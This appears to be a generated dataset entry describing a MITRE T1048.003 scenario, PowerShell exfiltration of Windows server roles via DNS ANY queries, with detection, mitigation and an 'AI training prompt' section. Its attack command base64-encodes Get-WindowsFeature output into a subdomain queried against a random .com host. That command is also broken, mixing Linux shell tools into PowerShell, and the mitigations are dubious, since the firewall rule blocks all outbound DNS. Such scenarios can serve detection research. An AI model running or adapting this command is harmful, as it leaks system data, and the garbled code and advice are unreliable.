---
type: campaign
scenario_id: 431
tactic: Exfiltration
technique: "T1048.003: Exfiltration Over Alternative Protocol"
technique_id: T1048.003
tags: [campaign, lotl, exfiltration]
---

# Using PowerShell to exfiltrate system roles via DNS ANY queries.

## Threat Description
Using PowerShell to exfiltrate system roles via DNS ANY queries.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $roles = Get-WindowsFeature | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($roles)); Resolve-DnsName -Type ANY $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null"
```

## Detection Logic
Monitor roles DNS: `wmic process where name='powershell.exe' get commandline | findstr Get-WindowsFeature`; DNS ANY spikes: `tshark -Y 'dns.qry.type == 255'`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block ANY DNS' dir=out action=block protocol=UDP remoteport=53`.

## AI Training Prompt
Train AI to detect PowerShell system roles exfiltration via DNS ANY queries by analyzing base64-encoded subdomains, Get-WindowsFeature execution, and DNS traffic patterns; suggest DNS filtering.

## References
- MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
